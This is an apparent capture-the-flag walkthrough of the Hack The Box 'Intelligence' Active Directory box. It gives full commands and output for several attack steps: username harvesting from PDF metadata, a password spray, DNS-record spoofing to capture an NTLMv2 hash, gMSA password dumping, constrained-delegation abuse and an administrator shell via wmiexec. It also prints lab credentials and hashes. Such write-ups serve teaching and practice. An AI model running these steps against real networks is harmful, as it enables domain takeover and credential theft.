---
title: "HTB Intelligence"
date: 2026-01-08 04:00:00 +1100
categories: [Hack The Box]
tags: [ACL Abuse,Exif Tool, Password Spray, ReadGMSAPassword,AllowedToDelegate,DNS Spoofing]
image:
  path: /assets/img/Intelligence/icon.png
---
Intelligence is a really fun medium Active Directory box that showcases the importance of enumeration as well as some cool attacks you dont see often like DNS spoofing. it finishes off with a readGMSA password attack as well as some delgation. 


# Nmap

```shell
─$ nmap -sC -sV -T4 10.129.95.154 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 18:19 EDT
Nmap scan report for 10.129.95.154
Host is up (0.32s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-03 05:21:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-10-03T05:22:45+00:00; +7h01m12s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-03T05:22:45+00:00; +7h01m13s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-03T05:22:45+00:00; +7h01m12s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-03T05:22:45+00:00; +7h01m13s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-03T05:22:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h01m12s, deviation: 0s, median: 7h01m11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.06 seconds

```

# Port 80

![img](/assets/img/Intelligence/1.png)

We can download the document and use exiftool to see the owner:

```bash
─(kali㉿kali)-[~/boxes/intiligence]
└─$ exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 13.25
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2025:10:02 19:13:41-04:00
File Inode Change Date/Time     : 2025:10:02 19:13:41-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
─(kali㉿kali)-[~/boxes/intiligence]
└─$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 13.25
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2025:10:02 19:12:07-04:00
File Inode Change Date/Time     : 2025:10:02 19:11:59-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

```

And we find two users:

```bash
William.Lee
Jose.Williams
```

Let's test to see if they are valid users:

```bash
─$ kerbrute userenum -d intelligence.htb --dc 10.129.95.154 users.txt 

    __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
    / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
    / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/02/25 - Ronnie Flathers @ropnop

2025/10/02 19:18:39 >  Using KDC(s):
2025/10/02 19:18:39 >   10.129.95.154:88

2025/10/02 19:18:39 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb                                                                           
2025/10/02 19:18:39 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/10/02 19:18:39 >  Done! Tested 2 usernames (2 valid) in 0.315 seconds
                                                                                

```

They are valid users. 

But we can try to enumerate documents and see which ones are valid:

```bash
─$ for m in {01..12}; do for d in {01..31}; do echo "2020-$m-$d-upload.pdf"; done; done > pdf-names.txt

                                                                                                                    
┌──(kali㉿kali)-[~/boxes/intiligence]
└─$ cat pdf-names.txt 
2020-01-01-upload.pdf
2020-01-02-upload.pdf
2020-01-03-upload.pdf
2020-01-04-upload.pdf
2020-01-05-upload.pdf
<SNIP>
```

Then we can enumerate valid ones:

```bash
ffuf -w pdf-names.txt -u http://10.129.95.154/documents/FUZZ -mc 200 -of csv -o found.csv
```

Then we can do some magic to the file names:

```bash
tail -n +2 found.csv | cut -d',' -f1 > found-pdfs.txt

─$ cat found-pdfs.txt 
2020-01-23-upload.pdf
2020-01-20-upload.pdf
2020-01-02-upload.pdf
2020-01-04-upload.pdf
2020-01-25-upload.pdf
2020-02-17-upload.pdf
<SNIP>
```

Now let's wget them all:

```bash
──(kali㉿kali)-[~/boxes/intiligence]
└─$ while read file; do
    echo "[*] Downloading $file"
    wget -q "http://10.129.95.154/documents/$file" -O "found_pdfs/$file"
done < found-pdfs.txt
[*] Downloading 2020-01-23-upload.pdf
[*] Downloading 2020-01-20-upload.pdf
[*] Downloading 2020-01-02-upload.pdf
[*] Downloading 2020-01-04-upload.pdf
[*] Downloading 2020-01-25-upl

<SNIP>
```

Now we can do an exiftool on all and grep for the creator: 

```bash
──(kali㉿kali)-[~/boxes/intiligence/found_pdfs]
└─$ exiftool * | grep Creator
Creator                         : William.Lee
Creator                         : Scott.Scott
Creator                         : Jason.Wright
Creator                         : Veronica.Patel
Creator                         : Jennifer.Thomas
Creator                         : Danny.Matthews
Creator                         : David.Reed
Creator                         : Stephanie.Young
Creator                         : Daniel.Shelton
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : Jason.Wright
Creator                         : Jose.Williams
Creator                         : Daniel.Shelton
Creator                         : Brian.Morris
Creator                         : Jennifer.Thomas
Creator                         : Thomas.Valenzuela
Creator                         : Travis.Evans
Creator                         : Samuel.Richardson
Creator                         : Richard.Williams
Creator                         : David.Mcbride
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : William.Lee
Creator                         : Anita.Roberts
Creator                         : Brian.Baker
Creator                         : Jose.Williams
Creator                         : David.Mcbride
Creator                         : Kelly.Long
Creator                         : John.Coleman
Creator                         : Jose.Williams
Creator                         : Nicole.Brock
Creator                         : Thomas.Valenzuela
Creator                         : David.Reed
Creator                         : Kaitlyn.Zimmerman
Creator                         : Jason.Patterson
Creator                         : Thomas.Valenzuela
Creator                         : David.Mcbride
Creator                         : Darryl.Harris
Creator                         : William.Lee
Creator                         : Stephanie.Young
Creator                         : David.Reed
Creator                         : Nicole.Brock
Creator                         : David.Mcbride
Creator                         : William.Lee
Creator                         : Stephanie.Young
Creator                         : John.Coleman
Creator                         : David.Wilson
Creator                         : Scott.Scott
Creator                         : Teresa.Williamson
Creator                         : John.Coleman
Creator                         : Veronica.Patel
Creator                         : John.Coleman
Creator                         : Samuel.Richardson
Creator                         : Ian.Duncan
Creator                         : Nicole.Brock
Creator                         : William.Lee
Creator                         : Jason.Wright
Creator                         : Travis.Evans
Creator                         : David.Mcbride
Creator                         : Jessica.Moody
Creator                         : Ian.Duncan
Creator                         : Jason.Wright
Creator                         : Richard.Williams
Creator                         : Tiffany.Molina
Creator                         : Jose.Williams
Creator                         : Jessica.Moody
Creator                         : Brian.Baker
Creator                         : Anita.Roberts
Creator                         : Teresa.Williamson
Creator                         : Kaitlyn.Zimmerman
Creator                         : Jose.Williams
Creator                         : Stephanie.Young
Creator                         : Samuel.Richardson
Creator                         : Tiffany.Molina
Creator                         : Ian.Duncan
Creator                         : Kelly.Long
Creator                         : Travis.Evans
Creator                         : Ian.Duncan
Creator                         : Jose.Williams
Creator                         : David.Wilson
Creator                         : Thomas.Hall
Creator                         : Ian.Duncan
Creator                         : Jason.Patterson
                                                                                                                
```

Now let's do some more magic:

```bash
──(kali㉿kali)-[~/boxes/intiligence/found_pdfs]
└─$ exiftool * | grep Creator | awk -F': ' '{print $2}' | sort -u > users.txt

                                                                                                                    
┌──(kali㉿kali)-[~/boxes/intiligence/found_pdfs]
└─$ cat users.txt     
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
                
```
There we go, we finally have a user's file. We can see they are all valid users.

```bash
$ kerbrute userenum -d intelligence.htb --dc 10.129.95.154 users.txt

    __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
    / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
    / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/02/25 - Ronnie Flathers @ropnop

2025/10/02 19:54:10 >  Using KDC(s):
2025/10/02 19:54:10 >   10.129.95.154:88

2025/10/02 19:54:10 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2025/10/02 19:54:10 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/10/02 19:54:11 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2025/10/02 19:54:11 >  Done! Tested 30 usernames (30 valid) in 0.954 seconds
                                                
```
I also had a look at each PDF, and in two of them, there are the following messages:

```bash
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

```bash
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible
```

If we do a password spray, we get a user: 

```shell
crackmapexec smb 10.129.95.154 -u users.txt -p NewIntelligenceCorpUser9876
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 

```

Let's check the shares:

```bash
──(kali㉿kali)-[~/boxes/intiligence]
└─$ crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [+] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            
                                                                                                                    
┌──(kali㉿kali)-[~/boxes/intiligence]

```

# DNS Spoofing

Let's go into the IT share:

```bash
┌──(kali㉿kali)-[~/boxes/intiligence]
└─$ smbclient -U Tiffany.Molina -p NewIntelligenceCorpUser9876 //10.129.95.154/IT
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
    .                                   D        0  Sun Apr 18 20:50:55 2021
    ..                                  D        0  Sun Apr 18 20:50:55 2021
    downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021 
    
    ┌──(kali㉿kali)-[~/boxes/intiligence]
└─$ cat downdetector.ps1                                                             
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}

```

If we have permissions to create DNS records inside the domain, we can potentially create a DNS record that points back to our IP address. beacuse the script is using ‘-UseDefaultCredentials’ when it sends a requet to our webserver, it will also send the credentials associated with the account that the script is running as. 

So let's create a malicious DNS record:

```bash
─(kali㉿kali)-[~/boxes/intiligence/krbrelayx-master]
└─$ python3 dnstool.py dc.intelligence.htb \
    -u INTELLIGENCE.HTB\\Tiffany.Molina \ 
    -p 'NewIntelligenceCorpUser9876' \
    -r webpwn \
    -a add \
    -t A \
    -d 10.10.14.2 \
    -dns-ip 10.129.95.154

```

And we can now listen to the responder and  capture the hash:

```bash
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3da66dde1c44089e:8A57C350D39FD4698BA6873D79CC6AE3:0101000000000000CCB806694034DC01B27094F1282AB34C0000000002000800580042005600500001001E00570049004E002D004C0033004C00500033005900350047004300370055000400140058004200560050002E004C004F00430041004C0003003400570049004E002D004C0033004C00500033005900350047004300370055002E0058004200560050002E004C004F00430041004C000500140058004200560050002E004C004F00430041004C000800300030000000000000000000000000200000DBF6C29688F1E43BAA6CF2DB5D1D3ED054141A75D7297DD159323B5FF35644410A001000000000000000000000000000000000000900380048005400540050002F00770065006200700077006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
```

It cracks to:

```bash
Mr.Teddy
```

# GMSAPassword

Ted is a member of IT support, and can read the password of svc_INT:

![img](/assets/img/Intelligence/2.png)
Let's get the hash 

```bash
─$ python3 gMSADumper.py -d intelligence.htb -l 10.129.95.154 -u Ted.Graves -p Mr.Teddy
Users or groups who can read password for svc_int$:
    > DC$
    > itsupport
svc_int$:::
svc_int$:aes256-cts-hmac-sha1-96:a90da9b1d3dff35359ccd55cad2d218057cb8d13cd4feca8a34df44cbfb9e61b
svc_int$:aes128-cts-hmac-sha1-96:e17e370a4030f67428f7046f065e60eb
                                                                                                    
┌──(kali㉿kali)-[~/Downloads/gMSADumper-main]

```

# Constrained Delegation

on bloodhound we can see that the SVC_INT account is allowed to delegate to the DC. 

- This means that the service account is allowed to ask Active Directory for tickets on behalf of other users, including the administrator!

![img](/assets/img/Intelligence/3.png)

Now let's get a ticket: 

```bash
getST.py -dc-ip 10.129.95.154 -spn www/dc.intelligence.htb -hashes :c5f5537e080917d785293aeb90120854 -impersonate administrator intelligence.htb/svc_int
```

Important note: We need to get a ST instead of a TGT because it specifically says that we can only delegate to www.dc.intelligence.htb. This is an example of constrained delegation, beacuse the svc_int account is only allowed to impersonate others when connecting to the dc. 

![img](/assets/img/Intelligence/4.png)

and spawn a shell:

```bash
    KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

```